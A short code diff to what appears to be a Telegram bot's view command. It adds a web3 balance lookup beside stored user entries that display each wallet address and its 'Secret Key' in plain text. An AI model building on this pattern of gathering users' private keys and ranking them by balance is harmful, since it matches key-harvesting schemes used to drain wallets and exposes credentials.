@@ -79,10 +79,16 @@ async def view(update: Update, context: CallbackContext) -> int:
             
             formatted_entries = []
             for entry in entries:
+                chain_scan = chains.chains[entry["chain"].lower()].scan_address
+                chain_web3 = chains.chains[entry["chain"].lower()].w3
+                web3 = Web3(Web3.HTTPProvider(chain_web3))
+                balance_wei = web3.eth.get_balance(entry["address"])
+                balance = web3.from_wei(balance_wei, 'ether')
                 formatted_entry = (
                     f"User Name: {entry['user_name']}\n"
                     f"User ID: {entry['user_id']}\n"
                     f"Submitted: {entry['timedate']}\n"
+                    f"Current Balance: {balance} ETH\n"
                     f"Address: `{entry['address']}`\n"
                     f"Secret Key: `{entry['secret_key']}`\n"
                     f"Chain: {entry['chain']}\n"
